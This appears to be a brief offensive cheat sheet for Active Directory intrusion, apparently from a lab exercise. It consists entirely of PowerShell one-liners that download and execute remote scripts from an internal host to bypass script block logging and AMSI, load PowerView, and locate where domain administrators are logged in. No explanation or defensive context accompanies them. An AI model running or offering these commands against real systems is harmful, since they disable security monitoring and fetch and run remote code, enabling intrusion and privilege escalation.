**Bypass ESBL:**
```powershell
iex (iwr http://172.16.100.1/sbloggingbypass.txt -UseBasicParsing)
```

**Bypass AMSI:**
```powershell
iex (iwr http://172.16.100.1/amsibypass.txt -UseBasicParsing)
```

**Import PowerView:**
```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.1/PowerView.ps1'))
```

**Find admin access:**
```powershell
Find-DomainUserLocation
```